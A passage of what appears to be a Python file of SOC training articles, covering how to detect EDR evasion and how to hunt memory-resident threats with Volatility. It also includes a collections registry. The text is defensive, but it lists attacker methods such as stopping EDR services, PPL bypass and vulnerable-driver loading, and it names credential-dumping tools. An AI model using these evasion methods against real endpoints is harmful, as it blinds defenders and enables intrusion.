- Detection: Monitor driver loading events (Sysmon Event ID 6) and maintain a blocklist of known vulnerable drivers

**EDR Agent Tampering:**
- Stopping or uninstalling the EDR agent service
- Renaming or deleting EDR files and directories
- Modifying EDR configuration to reduce monitoring
- Using PPL (Protected Process Light) bypass to terminate protected EDR processes

## Detection Strategies

**Self-Integrity Monitoring:**
- EDR agents should verify their own hook integrity periodically
- Monitor for agent health degradation or telemetry gaps
- Alert on EDR service stops, crashes, or configuration changes

**Environmental Indicators:**
- Newly loaded kernel drivers that are not in the organization's approved driver list
- Processes performing unusual DLL operations (reloading system DLLs)
- Gaps in telemetry that previously flowed consistently from an endpoint
- Process execution events without corresponding EDR telemetry (detection blind spots)

**Layered Detection:**
- Do not rely solely on EDR — correlate with network monitoring, SIEM, and other data sources
- Use canary files and processes to detect EDR-blind activity
- Monitor for known BYOVD driver hashes in driver load events

## Analyst Response

1. If EDR evasion is suspected, collect memory forensics independently of the EDR
2. Check EDR agent health and hook integrity on the affected endpoint
3. Review driver loading events for vulnerable or unsigned drivers
4. Correlate endpoint timeline with network data to fill EDR visibility gaps
5. Verify ETW provider status and event flow integrity
6. Escalate confirmed EDR bypass as a high-priority incident

## Key Takeaway

EDR evasion is an arms race. Understanding attacker techniques helps detection engineers build more resilient detections and analysts investigate incidents where EDR alerts are absent despite confirmed compromise. Layer defenses, monitor EDR health, and maintain independent telemetry sources to ensure visibility even when the primary sensor is compromised.
""",
    },
    {
        "title": "Memory-Resident Threat Detection — Hunting Threats in RAM",
        "tags": ["memory-forensics", "T1055", "T1620", "detection", "volatility", "threat-hunting"],
        "content": r"""# Memory-Resident Threat Detection — Hunting Threats in RAM

## Overview

Memory-resident threats operate exclusively in volatile memory, avoiding the filesystem to evade traditional security controls. Detecting these threats requires memory acquisition and analysis techniques that go beyond file scanning. This article covers memory forensics fundamentals for SOC analysts responding to suspected in-memory threats.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1055 | Process Injection | Defense Evasion, Privilege Escalation |
| T1620 | Reflective Code Loading | Defense Evasion |
| T1574.002 | DLL Side-Loading | Defense Evasion, Persistence |

## When to Perform Memory Analysis

Memory analysis is warranted when:
- EDR detects process injection but automated remediation is insufficient
- Behavioral anomalies exist (beaconing, lateral movement) without corresponding file-based IOCs
- A process exhibits suspicious behavior but its on-disk binary appears clean
- Threat intelligence indicates an adversary known for fileless techniques
- Incident response requires full scope assessment of a compromised endpoint

## Memory Acquisition

**Live Acquisition Methods:**
- `winpmem`: Open-source memory acquisition tool for Windows
- `DumpIt`: Creates a full physical memory dump with a single click
- `FTK Imager`: Forensic imaging tool with RAM capture capability
- `LiME`: Linux Memory Extractor kernel module for Linux systems

**Critical Considerations:**
- Acquire memory before rebooting or shutting down the system (volatility)
- Document the acquisition time and method for chain of custody
- Hash the memory dump immediately after acquisition
- Minimize activity on the system during acquisition to reduce contamination

## Analysis with Volatility Framework

Volatility is the standard open-source framework for memory forensics. Key plugins for threat detection:

**Process Analysis:**
- `pslist` / `psscan`: List running processes; `psscan` finds hidden processes by scanning for EPROCESS structures
- `pstree`: Display parent-child relationships to identify unusual process hierarchies
- `cmdline`: Extract command-line arguments for each process
- `dlllist`: List loaded DLLs per process; compare against expected module lists

**Code Injection Detection:**
- `malfind`: Identify memory regions with suspicious permissions (RWX) and content. The most important plugin for detecting injected code
- `ldrmodules`: Compare loaded modules across three PEB lists; discrepancies indicate stealth loading
- `hollowfind`: Detect process hollowing by comparing in-memory images to on-disk binaries
- `vadinfo`: Examine Virtual Address Descriptor details for each process's memory regions

**Network Indicators:**
- `netscan`: Display active and recently closed network connections with associated process IDs
- Cross-reference with network monitoring data to validate C2 connections

**Credential Extraction (Defensive Context):**
- `hashdump`: Extract password hashes to determine if credential theft occurred
- `mimikatz` plugin: Identify if Mimikatz or similar tools were used by examining memory artifacts

## Hunting Patterns

**Suspicious Memory Regions:**
- RWX memory pages in processes that should not have them
- Executable code in heap or stack regions
- PE headers found in non-image memory allocations (MEM_PRIVATE with MZ header)
- Large memory allocations in processes with typically small memory footprints

**Process Anomalies:**
- Processes with no corresponding on-disk binary
- svchost.exe instances with unusual parent processes (should be services.exe)
- Multiple instances of processes that normally run as singletons
- Processes with command-line arguments inconsistent with their purpose
- High-privilege processes spawned by low-privilege parents

**Module Anomalies:**
- DLLs loaded from non-standard paths (Temp, AppData, user directories)
- DLLs present in memory but absent from the PEB loaded module list (stealth loading)
- Unsigned or unusually named DLLs loaded into system processes

## Investigation Workflow

1. Acquire memory with minimal system disturbance
2. Run `pslist` and `pstree` to understand the process landscape
3. Execute `malfind` to identify injected code regions
4. Analyze suspicious processes with `dlllist`, `cmdline`, and `netscan`
5. Extract and analyze any discovered injected code or shellcode
6. Cross-reference findings with endpoint and network telemetry
7. Document all findings with memory offsets and extracted artifacts

## Key Takeaway

Memory forensics is the definitive method for detecting in-memory threats that leave no filesystem artifacts. The combination of `malfind` for injection detection, `psscan` for hidden processes, and `netscan` for network correlation provides a comprehensive view of memory-resident threats. Build memory acquisition capability into your incident response playbook to ensure readiness when fileless threats are encountered.
""",
    },
]

# ============================================================
# COLLECTIONS REGISTRY
# ============================================================

COLLECTIONS = [
    ("Command & Control and Exfiltration Detection", "Detection techniques for C2 communications, DNS tunneling, beaconing analysis, domain fronting, data exfiltration, TLS fingerprinting, and encrypted traffic anomalies.", C2_EXFIL),
    ("Web Application Attack Patterns", "Detection patterns for SQL injection, cross-site scripting, SSRF, directory traversal, API security flaws, command injection, and deserialization attacks.", WEB_ATTACKS),
    ("Defense Evasion Detection", "Identifying script obfuscation, process injection, LOLBins abuse, timestomping, log tampering, fileless techniques, EDR evasion, and memory-resident threats.", EVASION),
]
